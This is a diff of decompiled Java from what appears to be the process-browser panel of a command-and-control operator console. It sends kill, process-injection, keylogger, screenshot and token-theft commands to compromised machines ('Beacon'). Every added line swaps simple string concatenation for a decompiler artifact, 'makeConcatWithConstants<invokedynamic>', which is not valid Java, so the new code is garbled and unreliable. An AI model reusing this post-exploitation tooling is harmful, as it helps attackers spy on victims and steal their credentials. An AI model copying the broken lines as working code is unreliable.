@@ -43,7 +43,7 @@ public class ProcessBrowser extends AObject implements ActionListener {
 
          for(var5 = 0; var5 < var3.length; ++var5) {
             var4.input("kill " + var3[var5]);
-            var4.Kill(Integer.parseInt(var3[var5] + ""));
+            var4.Kill(Integer.parseInt(((Class)var3[var5]).makeConcatWithConstants<invokedynamic>(var3[var5])));
          }
 
          var4.Pause(500);
@@ -62,8 +62,8 @@ public class ProcessBrowser extends AObject implements ActionListener {
                Object[][] var3 = ProcessBrowser.this.browser.getSelectedValuesFromColumns(CommonUtils.toArray("PID, Arch"));
 
                for(int var4 = 0; var4 < var3.length; ++var4) {
-                  int var5 = Integer.parseInt(var3[var4][0] + "");
-                  String var6 = var3[var4][1] + "";
+                  int var5 = Integer.parseInt(((Class)var3[var4][0]).makeConcatWithConstants<invokedynamic>(var3[var4][0]));
+                  String var6 = ((Class)var3[var4][1]).makeConcatWithConstants<invokedynamic>(var3[var4][1]);
                   var2.input("inject " + var5 + " " + var6 + " " + var1);
                   var2.Inject(var5, var1, var6);
                }
@@ -83,8 +83,8 @@ public class ProcessBrowser extends AObject implements ActionListener {
             var9 = this.browser.getSelectedValuesFromColumns(CommonUtils.toArray("PID, Arch"));
 
             for(var5 = 0; var5 < var9.length; ++var5) {
-               int var6 = Integer.parseInt(var9[var5][0] + "");
-               String var7 = var9[var5][1] + "";
+               int var6 = Integer.parseInt(((Class)var9[var5][0]).makeConcatWithConstants<invokedynamic>(var9[var5][0]));
+               String var7 = ((Class)var9[var5][1]).makeConcatWithConstants<invokedynamic>(var9[var5][1]);
                var8.input("keylogger " + var6 + " " + var7);
                var8.KeyLogger(var6, var7);
             }
@@ -101,8 +101,10 @@ public class ProcessBrowser extends AObject implements ActionListener {
             SafeDialogs.askYesNoBoth("Would you like to take a single screenshot?\n\nPress 'Yes' to take a single screenshot.\n\nPress 'No' to take continuous screenshots.", "", new SafeDialogCallback() {
                public void dialogResult(String var1) {
                   for(int var2 = 0; var2 < var9.length; ++var2) {
-                     int var3 = Integer.parseInt(var9[var2][0] + "");
-                     String var4 = var9[var2][1] + "";
+                     Object[] var10000 = var9[var2];
+                     int var3 = Integer.parseInt(((Class)var10000[0]).makeConcatWithConstants<invokedynamic>(var10000[0]));
+                     var10000 = var9[var2];
+                     String var4 = ((Class)var10000[1]).makeConcatWithConstants<invokedynamic>(var10000[1]);
                      if ("yes".equals(var1)) {
                         var8.input("screenshot " + var3 + " " + var4);
                         var8.Screenshot(var3, var4);
@@ -131,7 +133,7 @@ public class ProcessBrowser extends AObject implements ActionListener {
 
             for(var5 = 0; var5 < var3.length; ++var5) {
                var4.input("steal_token " + var3[var5]);
-               var4.StealToken(Integer.parseInt(var3[var5] + ""));
+               var4.StealToken(Integer.parseInt(((Class)var3[var5]).makeConcatWithConstants<invokedynamic>(var3[var5])));
             }
 
             DialogUtils.showInfo("Tasked Beacon to steal a token");
